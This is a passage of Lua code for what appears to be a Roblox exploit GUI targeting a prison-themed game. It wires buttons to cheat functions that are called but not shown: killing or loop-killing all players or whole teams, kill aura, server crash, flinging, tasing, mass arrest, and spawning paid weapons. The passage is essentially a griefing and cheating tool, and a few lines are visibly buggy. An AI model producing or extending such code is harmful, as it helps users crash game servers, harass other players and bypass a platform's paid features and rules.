AutoGuns.BorderSizePixel = 0
AutoGuns.Size = UDim2.new(0, 200, 0, 50)
AutoGuns.Visible = false
AutoGuns.Font = Enum.Font.Roboto
AutoGuns.Text = "Auto Guns: On"
AutoGuns.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoGuns.TextSize = 14.000

UnautoGuns.Name = "UnautoGuns"
UnautoGuns.Parent = scripts
UnautoGuns.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
UnautoGuns.BorderSizePixel = 0
UnautoGuns.Size = UDim2.new(0, 200, 0, 50)
UnautoGuns.Font = Enum.Font.Roboto
UnautoGuns.Text = "Auto Guns"
UnautoGuns.TextColor3 = Color3.fromRGB(255, 255, 255)
UnautoGuns.TextSize = 14.000

AllGuns.Name = "AllGuns"
AllGuns.Parent = scripts
AllGuns.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
AllGuns.BorderSizePixel = 0
AllGuns.Size = UDim2.new(0, 200, 0, 50)
AllGuns.Font = Enum.Font.Roboto
AllGuns.Text = "All Guns"
AllGuns.TextColor3 = Color3.fromRGB(255, 255, 255)
AllGuns.TextSize = 14.000

Inmate.Name = "Inmate"
Inmate.Parent = scripts
Inmate.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
Inmate.BorderSizePixel = 0
Inmate.Size = UDim2.new(0, 200, 0, 50)
Inmate.Font = Enum.Font.Roboto
Inmate.Text = "Inmate"
Inmate.TextColor3 = Color3.fromRGB(255, 255, 255)
Inmate.TextSize = 14.000
Inmate.MouseButton1Down:Connect(function()
ChangeTeam(game.Teams.Inmates)
end)

Guard.Name = "Guard"
Guard.Parent = scripts
Guard.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
Guard.BorderSizePixel = 0
Guard.Size = UDim2.new(0, 200, 0, 50)
Guard.Font = Enum.Font.Roboto
Guard.Text = "Guard"
Guard.TextColor3 = Color3.fromRGB(255, 255, 255)
Guard.TextSize = 14.000
Guard.MouseButton1Down:Connect(function()
ChangeTeam(game.Teams.Guards)
end)

Criminal.Name = "Criminal"
Criminal.Parent = scripts
Criminal.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
Criminal.BorderSizePixel = 0
Criminal.Size = UDim2.new(0, 200, 0, 50)
Criminal.Font = Enum.Font.Roboto
Criminal.Text = "Criminal"
Criminal.TextColor3 = Color3.fromRGB(255, 255, 255)
Criminal.TextSize = 14.000
Criminal.MouseButton1Down:Connect(function()
local savedcf = savePos()
local savedcamcf = savecamPos()
if plr.Team == game.Teams.Guards then
TPCFrame(CFrame.new(-919.958, 95.327, 2138.189))
char:Wait() wait(0.065)
TPCFrame(savedcf)
workspace["CurrentCamera"].CFrame = savedcamcf
elseif plr.Team == game.Teams.Inmates then
TPCFrame(CFrame.new(-919.958, 95.327, 2138.189))
task.wait()
TPCFrame(savedcf)
end
end)

Neutral.Name = "Neutral"
Neutral.Parent = scripts
Neutral.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
Neutral.BorderSizePixel = 0
Neutral.Size = UDim2.new(0, 200, 0, 50)
Neutral.Font = Enum.Font.Roboto
Neutral.Text = "Neutral"
Neutral.TextColor3 = Color3.fromRGB(255, 255, 255)
Neutral.TextSize = 14.000
Neutral.MouseButton1Down:Connect(function()
ChangeTeam(game.Teams.Neutral)
end)

KillAura.Name = "KillAura"
KillAura.Parent = scripts
KillAura.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
KillAura.BorderSizePixel = 0
KillAura.Size = UDim2.new(0, 200, 0, 50)
KillAura.Visible = false
KillAura.Font = Enum.Font.Roboto
KillAura.Text = "Kill Aura: On"
KillAura.TextColor3 = Color3.fromRGB(255, 255, 255)
KillAura.TextSize = 14.000

UnkillAura.Name = "UnkillAura"
UnkillAura.Parent = scripts
UnkillAura.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
UnkillAura.BorderSizePixel = 0
UnkillAura.Size = UDim2.new(0, 200, 0, 50)
UnkillAura.Font = Enum.Font.Roboto
UnkillAura.Text = "Kill Aura"
UnkillAura.TextColor3 = Color3.fromRGB(255, 255, 255)
UnkillAura.TextSize = 14.000

Servercrash.Name = "Servercrash"
Servercrash.Parent = scripts
Servercrash.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
Servercrash.BorderSizePixel = 0
Servercrash.Size = UDim2.new(0, 200, 0, 50)
Servercrash.Font = Enum.Font.Roboto
Servercrash.Text = "Server Crash"
Servercrash.TextColor3 = Color3.fromRGB(255, 255, 255)
Servercrash.TextSize = 14.000

ff.Name = "ff"
ff.Parent = scripts
ff.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
ff.BorderSizePixel = 0
ff.Size = UDim2.new(0, 200, 0, 50)
ff.Visible = false
ff.Font = Enum.Font.Roboto
ff.Text = "ff: On"
ff.TextColor3 = Color3.fromRGB(255, 255, 255)
ff.TextSize = 14.000

unff.Name = "unff"
unff.Parent = scripts
unff.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
unff.BorderSizePixel = 0
unff.Size = UDim2.new(0, 200, 0, 50)
unff.Font = Enum.Font.Roboto
unff.Text = "ff"
unff.TextColor3 = Color3.fromRGB(255, 255, 255)
unff.TextSize = 14.000

view.Name = "view"
view.Parent = scripts
view.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
view.BorderSizePixel = 0
view.Size = UDim2.new(0, 200, 0, 50)
view.Font = Enum.Font.Roboto
view.Text = "view"
view.TextColor3 = Color3.fromRGB(255, 255, 255)
view.TextSize = 14.000

unview.Name = "unview"
unview.Parent = scripts
unview.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
unview.BorderSizePixel = 0
unview.Size = UDim2.new(0, 200, 0, 50)
unview.Visible = false
unview.Font = Enum.Font.Roboto
unview.Text = "unview"
unview.TextColor3 = Color3.fromRGB(255, 255, 255)
unview.TextSize = 14.000

antifling.Name = "antifling"
antifling.Parent = scripts
antifling.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
antifling.BorderSizePixel = 0
antifling.Size = UDim2.new(0, 200, 0, 50)
antifling.Font = Enum.Font.Roboto
antifling.Text = "antifling"
antifling.TextColor3 = Color3.fromRGB(255, 255, 255)
antifling.TextSize = 14.000
antifling.MouseButton1Down:Connect(function()
Antifling()
end)

fling.Name = "fling"
fling.Parent = scripts
fling.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
fling.BorderSizePixel = 0
fling.Size = UDim2.new(0, 200, 0, 50)
fling.Font = Enum.Font.Roboto
fling.Text = "fling"
fling.TextColor3 = Color3.fromRGB(255, 255, 255)
fling.TextSize = 14.000

loopfling.Name = "loopfling"
loopfling.Parent = scripts
loopfling.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
loopfling.BorderSizePixel = 0
loopfling.Size = UDim2.new(0, 200, 0, 50)
loopfling.Font = Enum.Font.Roboto
loopfling.Text = "loopfling"
loopfling.TextColor3 = Color3.fromRGB(255, 255, 255)
loopfling.TextSize = 14.000

unloopfling.Name = "unloopfling"
unloopfling.Parent = scripts
unloopfling.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
unloopfling.BorderSizePixel = 0
unloopfling.Size = UDim2.new(0, 200, 0, 50)
unloopfling.Visible = false
unloopfling.Font = Enum.Font.Roboto
unloopfling.Text = "unloopfling"
unloopfling.TextColor3 = Color3.fromRGB(255, 255, 255)
unloopfling.TextSize = 14.000

tase.Name = "tase"
tase.Parent = scripts
tase.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
tase.BorderSizePixel = 0
tase.Size = UDim2.new(0, 200, 0, 50)
tase.Font = Enum.Font.Roboto
tase.Text = "tase"
tase.TextColor3 = Color3.fromRGB(255, 255, 255)
tase.TextSize = 14.000

arrest.Name = "arrest"
arrest.Parent = scripts
arrest.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
tasearrestBorderSizePixel = 0
arrest.Size = UDim2.new(0, 200, 0, 50)
arrest.Font = Enum.Font.Roboto
arrest.Text = "arrest"
arrest.TextColor3 = Color3.fromRGB(255, 255, 255)
arrest.TextSize = 14.000

meleekill.Name = "meleekill"
meleekill.Parent = scripts
meleekill.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
meleekill.BorderSizePixel = 0
meleekill.Size = UDim2.new(0, 200, 0, 50)
meleekill.Font = Enum.Font.Roboto
meleekill.Text = "meleekill"
meleekill.TextColor3 = Color3.fromRGB(255, 255, 255)
meleekill.TextSize = 14.000

goto.Name = "goto"
goto.Parent = scripts
goto.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
goto.BorderSizePixel = 0
goto.Size = UDim2.new(0, 200, 0, 50)
goto.Font = Enum.Font.Roboto
goto.Text = "goto"
goto.TextColor3 = Color3.fromRGB(255, 255, 255)
goto.TextSize = 14.000
goto.MouseButton1Down:Connect(function()
local args = GetPlayer(player.Text)
Goto(args)
end)

meleelk.Name = "meleelk"
meleelk.Parent = scripts
meleelk.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
meleelk.BorderSizePixel = 0
meleelk.Size = UDim2.new(0, 200, 0, 50)
meleelk.Font = Enum.Font.Roboto
meleelk.Text = "meleelk"
meleelk.TextColor3 = Color3.fromRGB(255, 255, 255)
meleelk.TextSize = 14.000

unmeleelk.Name = "unmeleelk"
unmeleelk.Parent = scripts
unmeleelk.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
unmeleelk.BorderSizePixel = 0
unmeleelk.Size = UDim2.new(0, 200, 0, 50)
unmeleelk.Visible = false
unmeleelk.Font = Enum.Font.Roboto
unmeleelk.Text = "unmeleelk"
unmeleelk.TextColor3 = Color3.fromRGB(255, 255, 255)
unmeleelk.TextSize = 14.000

saveposition.Name = "saveposition"
saveposition.Parent = scripts
saveposition.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
saveposition.BorderSizePixel = 0
saveposition.Size = UDim2.new(0, 200, 0, 50)
saveposition.Font = Enum.Font.Roboto
saveposition.Text = "saveposition"
saveposition.TextColor3 = Color3.fromRGB(255, 255, 255)
saveposition.TextSize = 14.000
saveposition.MouseButton1Down:Connect(function()
savedcf = savePos()
end)

loadposition.Name = "loadposition"
loadposition.Parent = scripts
loadposition.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
loadposition.BorderSizePixel = 0
loadposition.Size = UDim2.new(0, 200, 0, 50)
loadposition.Font = Enum.Font.Roboto
loadposition.Text = "loadposition"
loadposition.TextColor3 = Color3.fromRGB(255, 255, 255)
loadposition.TextSize = 14.000
loadposition.MouseButton1Down:Connect(function()
TPCFrame(savedcf)
end)

player.Name = "player"
player.Parent = main
player.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
player.BorderSizePixel = 0
player.Position = UDim2.new(0.0246153846, 0, 0.870292902, 0)
player.Size = UDim2.new(0, 410, 0, 33)
player.ClearTextOnFocus = true
player.Font = Enum.Font.SourceSans
player.PlaceholderColor3 = Color3.fromRGB(152, 152, 152)
player.PlaceholderText = "PLAYER"
player.Text = ""
player.TextColor3 = Color3.fromRGB(255, 255, 255)
player.TextSize = 14.000

Refresh.MouseButton1Down:Connect(function()
ChangeTeam(plr.Team)
end)

AutoRespawn.MouseButton1Down:Connect(function()
AutoRespawn.Visible = false
UnautoRespawn.Visible = true
getgenv().autore = false A()
end)

UnautoRespawn.MouseButton1Down:Connect(function()
UnautoRespawn.Text = "Auto Respawn: Off"
UnautoRespawn.Visible = false
AutoRespawn.Visible = true
getgenv().autore = true A()
end)

Kill.MouseButton1Down:Connect(function()
local Target = player.Text
if Target == "all" or Target == "others" or Target == "everyone" then
KillAll()
Notif("(Success) Killed all")
elseif Target == "inmates" then
KillInmates()
Notif("(Success) Killed inmates")
elseif Target == "guards" then
KillGuards()
Notif("(Success) Killed guards")
elseif Target == "criminals" then
KillCriminals()
Notif("(Success) Killed criminals")
else
if GetPlayer(Target) ~= nil then
CheckTeamKill(Target)
Notif("(Success) Killed "..GetPlayer(Target).DisplayName)
else
Notif("(Error) No Player Found",3)
end
end
end)

Loopkill.MouseButton1Down:Connect(function()
local Target = player.Text
if Target == "all" or Target == "others" or Target == "everyone" then
getgenv().loopkillall = true
U()
Notif("(Success) Loopkilled all")
Loopkill.Visible = false
Unloopkill.Visible = true
elseif Target == "inmates" then
getgenv().loopkillinmates = true
C()
Notif("(Success) Loopkilled inmates")
Loopkill.Visible = false
Unloopkill.Visible = true
elseif Target == "guards" then
getgenv().loopkillguards = true
G()
Notif("(Success) Loopkilled guards")
Loopkill.Visible = false
Unloopkill.Visible = true
elseif Target == "criminals" then
getgenv().loopkillcriminals = true
D()
Notif("(Success) Loopkilled criminals")
Loopkill.Visible = false
Unloopkill.Visible = true
else
if GetPlayer(Target) ~= nil then
getgenv().loopkillplayer = true
H(Target)
Notif("(Success) Loopkilled "..GetPlayer(Target).DisplayName)
Loopkill.Visible = false
Unloopkill.Visible = true
else
Notif("(Error) No Player Found",3)
Loopkill.Visible = true
Unloopkill.Visible = false
end
end
end)

Unloopkill.MouseButton1Down:Connect(function()
Loopkill.Visible = true
Unloopkill.Visible = false
local Target = player.Text
if Target == "all" or Target == "others" or Target == "everyone" then
getgenv().loopkillall = false
U()
Notif("(Success) Unloopkilled all")
elseif Target == "inmates" then
getgenv().loopkillinmates = false
C()
Notif("(Success) Unloopkilled inmates")
elseif Target == "guards" then
getgenv().loopkillguards = false
G()
Notif("(Success) Unloopkilled guards")
elseif Target == "criminals" then
getgenv().loopkillcriminals = false
D()
Notif("(Success) Unloopkilled criminals")
else
getgenv().loopkillplayer = false H()
Notif("(Success) Unloopkill")
end
end)

AutoGuns.MouseButton1Down:Connect(function()
AutoGuns.Visible = false
UnautoGuns.Visible = true
getgenv().autoguns = false Y()
end)

UnautoGuns.MouseButton1Down:Connect(function()
UnautoGuns.Text = "Auto Guns: Off"
UnautoGuns.Visible = false
AutoGuns.Visible = true
getgenv().autoguns = true Y()
end)

AllGuns.MouseButton1Down:Connect(function()
if BuyGamepass then
	GiveItem("AK-47")
	GiveItem("Remington 870")
	GiveItem("M9")
	GiveItem("M4A1")
else
	GiveItem("AK-47")
	GiveItem("Remington 870")
	GiveItem("M9")
end
end)

KillAura.MouseButton1Down:Connect(function()
KillAura.Visible = false
UnkillAura.Visible = true
getgenv().killaura = false F()
end)

UnkillAura.MouseButton1Down:Connect(function()
UnkillAura.Text = "Kill Aura: Off"
UnkillAura.Visible = false
KillAura.Visible = true
getgenv().killaura = true F()
end)

Servercrash.MouseButton1Down:Connect(function()
ServerCrash()
end)

ff.MouseButton1Down:Connect(function()
ff.Visible = false
unff.Visible = true
getgenv().ff = false K()
end)

unff.MouseButton1Down:Connect(function()
unff.Text = "ff: Off"
unff.Visible = false
ff.Visible = true
getgenv().ff = true K()
end)

view.MouseButton1Down:Connect(function()
local Target = player.Text
if GetPlayer(Target) ~= nil then
getgenv().viewplayer = true M(Target)
Notif("(Success) View "..GetPlayer(Target).DisplayName)
view.Visible = false
unview.Visible = true
else
Notif("(Error) No Player Found")
view.Visible = true
unview.Visible = false
end
end)

unview.MouseButton1Down:Connect(function()
view.Visible = true
unview.Visible = false
getgenv().viewplayer = false M()
View("me")
end)

fling.MouseButton1Down:Connect(function()
local Target = player.Text
if GetPlayer(Target) ~= nil then
Fling(Target)
Notif("(Success) Fling "..GetPlayer(Target).DisplayName)
else
Notif("(Error) No Player Found")
end
end)

loopfling.MouseButton1Down:Connect(function()
local Target = player.Text
if GetPlayer(Target) ~= nil then
getgenv().loopfling = true E(Target)
Notif("(Success) View "..GetPlayer(Target).DisplayName)
loopfling.Visible = false
unloopfling.Visible = true
else
Notif("(Error) No Player Found")
loopfling.Visible = true
unloopfling.Visible = false
end
end)

unloopfling.MouseButton1Down:Connect(function()
loopfling.Visible = true
unloopfling.Visible = false
getgenv().loopfling = false E()
end)

tase.MouseButton1Down:Connect(function()
local Target = player.Text
if Target == "all" or Target == "others" or Target == "everyone" then
TaseAll()
Notif("(Success) Tase All")
elseif Target == "inmates" or Target == "prisoners" then
TaseTeam(game.Teams.Inmates)
Notif("(Success) Tase Inmates")
elseif Target == "criminals" or Target == "crims" then
TaseTeam(game.Teams.Criminals)
Notif("(Success) Tase Criminals")
else
if GetPlayer(Target) ~= nil then
Tase(GetPlayer(Target))
Notif("(Success) Tase "..GetPlayer(Target).DisplayName)
else
Notif("(Error) No Player Found")
end
end
end)

arrest.MouseButton1Down:Connect(function()
local args = player.Text
local Player = GetPlayer(args)
if args == "all" then
for _,x in pairs(game.Players:GetPlayers()) do
if x ~= plr then
if x.Team == game.Teams.Criminals or x.Team == game.Teams.Inmates then
Arrest(x)
end
end
end
elseif args == "inmates" then
for _,x in pairs(game.Players:GetPlayers()) do
if x ~= plr then
if x.Team == game.Teams.Inmates then
Arrest(x)
end
end
end
elseif args == "criminals" then
for _,x in pairs(game.Players:GetPlayers()) do
if x ~= plr then
if x.Team == game.Teams.Criminals then
Arrest(x)
end
end
end
else
if Player ~= nil then
Arrest(Player)
Notif("(Success) Arrest "..Player.DisplayName)
else
Notif("(Error) No Player Found")
end
end
end)

meleekill.MouseButton1Down:Connect(function()
local args = player.Text
if args == "all" or args == "everyone" or args == "others" then
for _,v in pairs(game.Players:GetPlayers()) do
if v ~= plr then
MeleeKill(v)
end
end
TPCFrame(savedcf)
Notif("(Success) Meleekill All")
elseif args == "inmates" or args == "prisoners" then
for _,v in pairs(game.Teams.Inmates:GetPlayers()) do
if v ~= plr then
MeleeKill(v)
end
end
Notif("(Success) Meleekill Inmates")
elseif args == "guards" or args == "cops" then
for _,v in pairs(game.Teams.Guards:GetPlayers()) do
if v ~= plr then
MeleeKill(v)
end
end
Notif("(Success) Meleekill Guards")
elseif args == "criminals" or args == "crims" then
for _,v in pairs(game.Teams.Criminals:GetPlayers()) do
if v ~= plr then
MeleeKill(v)
end
end
Notif("(Success) Meleekill Criminals")
else
if GetPlayer(args) ~= nil then
MeleeKill(GetPlayer(args))
Notif("(Success) Meleekill "..GetPlayer(args).DisplayName)
else
Notif("(Error) No Player Found")
end
end
end)

meleelk.MouseButton1Down:Connect(function()
local args = player.Text
if args == "all" or args == "everyone" or args == "others" then
getgenv().loopmkillall = true T()
Notif("(Success) Loopmkilled All")
meleelk.Visible = false
unmeleelk.Visible = true
elseif args == "inmates" then
getgenv().loopmkillinmates = false O()
Notif("(Success) Loopmkilled Inmates")
meleelk.Visible = false
unmeleelk.Visible = true
elseif args == "guards" then
getgenv().loopmkillguards = true X()
Notif("(Success) Loopmkilled Guards")
meleelk.Visible = false
unmeleelk.Visible = true
elseif args == "criminals" then
getgenv().loopmkillcriminals = true Z()
Notif("(Success) Loopmkilled Criminals")
meleelk.Visible = false
unmeleelk.Visible = true
else
if GetPlayer(args) ~= nil then
getgenv().loopmkillplayer = true I(GetPlayer(args))
Notif("(Success) Loopmkilled "..GetPlayer(args).DisplayName)
meleelk.Visible = false
unmeleelk.Visible = true
else
Notif("(Error) No Player Found")
meleelk.Visible = true
unmeleelk.Visible = false
end
end
end)

unmeleelk.MouseButton1Down:Connect(function()
meleelk.Visible = true
unmeleelk.Visible = false
getgenv().loopmkillall = false T()
getgenv().loopmkillinmates = false O()
getgenv().loopmkillguards = false X()
getgenv().loopmkillcriminals = false Z()
getgenv().loopmkillplayer = false I()
Notif("(Success) Unloopmkill All")
end)
